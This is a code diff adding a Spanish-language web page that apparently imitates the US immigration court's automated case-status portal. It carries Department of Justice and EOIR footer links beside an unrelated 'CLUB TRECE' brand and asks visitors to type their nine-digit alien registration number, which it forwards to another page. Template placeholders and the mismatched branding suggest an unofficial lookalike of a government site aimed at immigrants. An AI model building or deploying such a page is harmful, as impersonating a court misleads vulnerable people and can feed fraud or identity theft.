@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sistema de Información</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      background-color: #fff;
+      color: #000;
+    }
+
+    /* Barra superior fina */
+    .top-bar {
+      background-color: #000;
+      color: #fff;
+      font-size: 0.8rem;
+      padding: 0.5rem 1rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .menu-icon {
+      cursor: pointer;
+    }
+
+ /* Header principal */
+  .header {
+  background-color: #111;
+  padding: 20xp;
+  font-size: 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+    .logo {
+      background-color: #fff;
+      color: #000;
+      padding: 0.5rem 1rem;
+      font-weight: bold;
+      font-size: 1.5rem;
+    }
+
+    /* Barra amarilla */
+    .yellow-bar {
+  background-color: #ffd700;
+  padding: 20xp /* duplicamos el alto */
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+    .yellow-bar a {
+      background-color: #fff;
+      color: #000;
+      padding: 0.5rem 1rem;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    /* Sección principal 50/50 */
+    .main-section {
+      display: flex;
+      min-height: 400px;
+    }
+
+    .left {
+      width: 45%;
+      padding: 2rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+     .right {
+  padding: 2rem;
+  background-color: #fff;
+  border-radius: 10px;
+  max-width: 500px;
+  margin: auto;
+  font-family: 'Inter', sans-serif;
+}
+
+.right h2 {
+  font-size: 1.5rem;
+  font-weight: bold;
+  margin-bottom: 1rem;
+}
+
+.right p {
+  margin-bottom: 0.5rem;
+}
+
+.required {
+  color: #d10000;
+  font-size: 0.9rem;
+}
+
+.help {
+  color: #0056b3;
+  text-decoration: none;
+  font-size: 0.9rem;
+  margin-left: 0.5rem;
+}
+
+.code-inputs {
+  display: flex;
+  gap: 10px;
+  margin: 1rem 0;
+}
+
+.code-inputs input {
+  width: 40px;
+  height: 50px;
+  text-align: center;
+  font-size: 1.5rem;
+  border: 2px solid #ccc;
+  border-radius: 5px;
+  outline: none;
+}
+
+.code-inputs input:focus {
+  border-color: #007bff;
+}
+    
+.right button {
+  width: 460px;
+  display: block;
+  margin: 0 auto;
+  padding: 0.8rem 3rem;
+  background-color: #ccc;
+  border: none;
+  color: white;
+  font-weight: bold;
+  font-size: 1rem;
+  cursor: not-allowed;
+  border-radius: 5px;
+  transition: background-color 0.3s ease;
+}
+
+.right button:enabled {
+  background-color: #000;
+  cursor: pointer;
+}
+
+.info {
+  margin-top: 1rem;
+  font-size: 0.9rem;
+  color: #333;
+  display: flex;
+  align-items: flex-start;
+  gap: 8px;
+  }
+    .right-side {
+  background: linear-gradient(to bottom, #0a2a43, #09223c); /* Fondo azul */
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 2rem;
+  width: 55%;
+  min-height: 100vh;
+}
+
+.white-box {
+  background: #fff;
+  padding: 2rem;
+  border-radius: 12px;
+  box-shadow: 0 0 30px rgba(0, 0, 0, 0.2);
+  max-width: 600px;
+  width: 100%;
+  color: #000;
+  display: flex;
+  flex-direction: column;
+  align-items: center; /* CENTRA EL CONTENIDO HORIZONTALMENTE */
+}
+
+    /* Footer */
+    footer {
+      margin-top: auto;
+    }
+
+    .footer-main {
+      background-color: #000;
+      color: #fff;
+      text-align: center;
+      padding: 2rem 1rem;
+      font-size: 1rem;
+    }
+
+    .footer-bottom {
+      background-color: #111;
+      color: #fff;
+      text-align: center;
+      padding: 1rem;
+      font-size: 0.8rem;
+    }
+
+  @media (max-width: 768px) {
+  .main-content {
+    flex-direction: column;
+  }
+
+  .left-column, .right-column {
+    width: 100%;
+    max-width: 100%;
+    }
+      
+  .code-separator {
+  color: transparent;
+  font-size: 2rem;
+  user-select: none;
+}
+  </style>
+</head>
+<body style="display: flex; flex-direction: column; min-height: 100vh;">
+
+  <div style="background-color: black; color: white; padding: 6px 16px; font-family: sans-serif; display: flex; align-items: center; font-size: 14px;">
+    <span style="margin-right: 10px;">
+      <img src="https://flagcdn.com/us.svg" alt="Bandera Estados Unidos" style="width: 20px; height: 14px; margin-right: 6px; vertical-align: middle;">
+      Información importante para los visitantes
+    </span>
+  
+  <!-- Botón desplegable -->
+  <div style="position: relative;">
+    <button onclick="toggleDropdown()" style="background: none; border: none; color: #ffd700; cursor: pointer; font-weight: bold;">
+      Revisa aquí ▼
+    </button>
+
+    <!-- Contenido desplegable -->
+    <div id="dropdownContent" style="display: none; position: absolute; top: 100%; left: 0; background-color: #222; color: white; padding: 10px; width: 250px; box-shadow: 0 4px 8px rgba(0,0,0,0.3); z-index: 10;">
+      Aquí puedes encontrar información relevante sobre cómo funciona el sistema de infracciones y cómo consultar tu estado actual.
+    </div>
+  </div>
+</div>
+
+<script>
+  function toggleDropdown() {
+    const dropdown = document.getElementById("dropdownContent");
+    dropdown.style.display = dropdown.style.display === "none" ? "block" : "none";
+  }
+</script>
+
+  <!-- Header -->
+<header style="background-color: #111; height: 80px; display: flex; justify-content: flex-start; align-items: center; padding: 0 30px;">
+  <img src="logo.png" alt="Logo" style="height: 50px;">
+</header>
+
+  <!-- Barra amarilla -->
+  <section style="background-color: #fcd100; padding: 20px 20px; font-family: Arial, sans-serif;">
+  <div style="color: #111; font-size: 16px; font-weight: bold;">
+    Texto de la barra amarilla | revisa el link:
+    <a href="https://tupagina.com/enlace" target="_blank" style="text-decoration: underline; color: #000;">
+      este es el link
+    </a>
+  </div>
+</section>
+
+  <!-- Sección dividida -->
+  <section class="main-section">
+   <!-- Lado izquierdo -->
+<div class="left" style="background-color: #f9f9fc; display: flex; justify-content: center; align-items: center; text-align: center; padding: 2rem;">
+  <div style="max-width: 600px;">
+    <img src="https://img.icons8.com/ios-filled/100/000000/courthouse.png" alt="Icono tribunal" style="width: 80px; margin-bottom: 2rem;" />
+    <h1 style="font-size: 2.5rem; font-weight: 800; margin-bottom: 1.5rem; color: #111; text-align: center;">
+      Información automatizada<br>de casos
+    </h1>
+    <p style="font-size: 1.2rem; line-height: 1.8rem; color: #333; text-align: center;">
+      Bienvenido al sistema de información automatizada del Tribunal de Inmigración.
+      La siguiente información está relacionada exclusivamente con el caso principal.
+      Por favor comuníquese con su tribunal asignado si necesita información sobre una audiencia de fianza.
+    </p>
+  </div>
+</div>
+
+ <!-- Lado derecho -->
+<div class="right-side" style="background: linear-gradient(to bottom, #0a2a43, #09223c); display: flex; align-items: center; justify-content: center; width: 55%; padding: 2rem;">
+  <div class="white-box" style="background: #fff; padding: 2.5rem; border-radius: 12px; box-shadow: 0 0 30px rgba(0,0,0,0.2); max-width: 95%; width: 95%; text-align:center;">
+    
+    <h2 style="font-size: 1.7rem; margin-bottom: 1rem;">Ingrese su número de registro de Extranjero</h2>
+    
+    <p style="font-size: 1rem; margin-bottom: 1rem;">
+      <strong>Número de registro de extranjero</strong>
+      <span class="required" style="font-size: 0.9rem;">*Obligatorio</span>
+      <a href="#" class="help" style="font-size: 0.9rem;">¿Qué es un número de inmigrante extranjero?</a>
+    </p>
+
+    <div class="code-inputs" style="display:flex; gap:12px; margin: 2rem auto; justify-content: center;">
+      <input type="text" maxlength="1" inputmode="numeric" style="width:50px; height:60px; font-size:1.8rem; text-align:center; border:2px solid #ccc; border-radius:6px;">
+      <input type="text" maxlength="1" inputmode="numeric" style="width:50px; height:60px; font-size:1.8rem; text-align:center; border:2px solid #ccc; border-radius:6px;">
+      <input type="text" maxlength="1" inputmode="numeric" style="width:50px; height:60px; font-size:1.8rem; text-align:center; border:2px solid #ccc; border-radius:6px;">
+
+
+      <input type="text" maxlength="1" inputmode="numeric" style="width:50px; height:60px; font-size:1.8rem; text-align:center; border:2px solid #ccc; border-radius:6px;">
+      <input type="text" maxlength="1" inputmode="numeric" style="width:50px; height:60px; font-size:1.8rem; text-align:center; border:2px solid #ccc; border-radius:6px;">
+      <input type="text" maxlength="1" inputmode="numeric" style="width:50px; height:60px; font-size:1.8rem; text-align:center; border:2px solid #ccc; border-radius:6px;">
+
+
+      <input type="text" maxlength="1" inputmode="numeric" style="width:50px; height:60px; font-size:1.8rem; text-align:center; border:2px solid #ccc; border-radius:6px;">
+      <input type="text" maxlength="1" inputmode="numeric" style="width:50px; height:60px; font-size:1.8rem; text-align:center; border:2px solid #ccc; border-radius:6px;">
+      <input type="text" maxlength="1" inputmode="numeric" style="width:50px; height:60px; font-size:1.8rem; text-align:center; border:2px solid #ccc; border-radius:6px;">
+    </div>
+
+    <!-- Botón proporcional -->
+    <button id="btnEnviar" disabled 
+      style="width: 500px; padding: 1rem; font-size: 1.1rem; border-radius: 8px; background-color:#ccc; color:#fff; border:none; cursor:not-allowed;">
+      ENVIAR
+    </button>
+
+    <p class="info" style="margin-top: 2rem; font-size: 0.95rem; color:#333; text-align:justify; line-height:1.5;">
+      <span class="icon">ℹ️</span>
+      La información sobre el caso que aparece en este sistema automatizado, se provee apenas para su conveniencia. Los documentos que se le emitan a usted o a su representante por el tribunal de inmigración o el tribunal de apelaciones, son los únicos de carácter oficial relacionado a su caso.
+    </p>
+  </div>
+</div>
+
+  </section>
+  
+<!-- FOOTER -->
+<footer class="site-footer">
+  <style>
+    .site-footer {
+      background-color: #1a1a1a;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      padding: 40px 20px;
+      font-size: 14px;
+    }
+
+    .footer-top {
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+    }
+
+    .footer-column {
+      display: flex;
+      flex-direction: column;
+      width: 22%;
+      margin-bottom: 20px;
+    }
+
+    .footer-column a {
+      color: #ffffff;
+      text-decoration: underline;
+      margin-bottom: 6px;
+      transition: color 0.2s ease;
+    }
+
+    .footer-column a:hover {
+      color: #0af;
+    }
+
+    .footer-divider {
+      border: none;
+      margin: 0;
+    }
+
+    .footer-bottom {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+
+    .footer-info p {
+      margin: 3px 0;
+      color: #ccc;
+    }
+
+    .footer-branding {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #fff;
+    }
+
+    .footer-logo {
+      height: 30px;
+    }
+
+    @media (max-width: 768px) {
+      .footer-column {
+        width: 100%;
+      }
+      .footer-bottom {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
+      }
+    }
+  </style>
+
+  <div class="footer-top">
+    <div class="footer-column">
+      <a href="#">Archivo</a>
+      <a href="#">Accesibilidad</a>
+      <a href="#">Calidad de Información</a>
+      <a href="#">Política de Privacidad</a>
+      <a href="#">Políticas Legales</a>
+    </div>
+    <div class="footer-column">
+      <a href="#">Redes Sociales</a>
+      <a href="#">Presupuesto</a>
+      <a href="#">Inspector General</a>
+      <a href="#">No FEAR Act</a>
+      <a href="#">Para Empleados</a>
+    </div>
+    <div class="footer-column">
+      <a href="#">Ley FOIA</a>
+      <a href="#">USA.gov</a>
+      <a href="#">Contacto</a>
+      <a href="#">Principal EOIR</a>
+      <a href="#">Justice.gov</a>
+    </div>
+    <div class="footer-column">
+      <a href="#">Recursos Corte</a>
+      <a href="#">Asistencia Técnica</a>
+      <a href="#">hCaptcha</a>
+      <a href="#">Política hCaptcha</a>
+      <a href="#">Términos hCaptcha</a>
+    </div>
+  </div>
+
+  <hr class="footer-divider">
+
+  <div class="footer-bottom">
+    <div class="footer-info">
+      <p>Department of Justice | Executive Office for Review</p>
+      <p><em>&copy; 2025</em></p>
+    </div>
+    <div class="footer-branding">
+      <img src="ruta-a-tu-logo.png" alt="Logo" class="footer-logo">
+      <span><strong>CLUB TRECE</strong> | Acceso seguro</span>
+    </div>
+  </div>
+</footer>
+
+ <script>
+  const inputs = document.querySelectorAll('.code-inputs input');
+  const button = document.querySelector('#btnEnviar');
+
+  // Verifica que todos los inputs estén llenos
+  function checkInputs() {
+    const allFilled = Array.from(inputs).every(input => input.value.trim().length === 1);
+    button.disabled = !allFilled;
+    button.style.backgroundColor = allFilled ? '#007bff' : '#ccc';
+    button.style.cursor = allFilled ? 'pointer' : 'not-allowed';
+  }
+
+  // Avanza automáticamente al siguiente input
+  inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+      if (input.value.length === 1) {
+        let nextInput = inputs[index + 1];
+        if (nextInput) nextInput.focus();
+      }
+      checkInputs();
+    });
+  });
+
+ // 👉 Acción al presionar ENVIAR con prefijo incluido
+button.addEventListener('click', () => {
+  const codigo = Array.from(inputs).map(input => input.value).join('');
+
+  if (codigo.length < 3) {
+    alert("Código inválido");
+    return;
+  }
+
+  // Envía el código completo a caso.html
+  window.location.href = `caso.html?codigo=${codigo}`;
+});
+  checkInputs(); // Ejecuta validación al cargar
+</script>
+ 
+<!-- Modal de Descargo de Responsabilidad -->
+<div id="welcomeModal" style="
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.85);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+">
+  <div style="
+    background: white;
+    padding: 40px;
+    border-radius: 10px;
+    width: 70%;
+    max-width: 900px;
+    display: flex;
+    gap: 20px;
+    font-family: 'Inter', sans-serif;
+  ">
+    <!-- Columna de texto -->
+    <div style="flex: 1;">
+      <h2 style="margin-bottom: 20px; font-size: 2rem; color:#111;">
+        Descargo de Responsabilidad
+      </h2>
+      <p style="font-size: 1.2rem; margin-bottom: 30px; color:#333; text-align: justify;">
+        La información proporcionada en este sistema es únicamente de carácter informativo y 
+        no constituye un documento oficial. Los datos aquí mostrados pueden no estar 
+        actualizados y no sustituyen los documentos emitidos directamente por el tribunal 
+        de inmigración o la junta de apelaciones. El usuario es responsable de verificar 
+        la información oficial directamente con las autoridades competentes.
+      </p>
+      <button id="btnAceptar" style="
+        background: #007bff;
+        color: white;
+        border: none;
+        padding: 15px 40px;
+        font-size: 1.2rem;
+        border-radius: 6px;
+        cursor: pointer;
+      ">ACEPTAR</button>
+    </div>
+
+    <!-- Columna de imagen -->
+    <div style="flex: 1; display:flex; align-items:center; justify-content:center;">
+      <img src="tu-imagen.jpg" alt="Imagen descriptiva" style="max-width:100%; border-radius:8px;">
+    </div>
+  </div>
+</div>
+
+<script>
+  const modal = document.getElementById('welcomeModal');
+  const btnAceptar = document.getElementById('btnAceptar');
+
+  // Solo se puede cerrar con el botón Aceptar
+  btnAceptar.addEventListener('click', () => {
+    modal.style.display = 'none';
+  });
+
+  // No se cierra al hacer clic fuera
+  modal.addEventListener('click', (e) => {
+    if (e.target === modal) {
+      // No permitir cierre al hacer clic fuera
+    }
+  });
+</script>
+</body>
+</html>
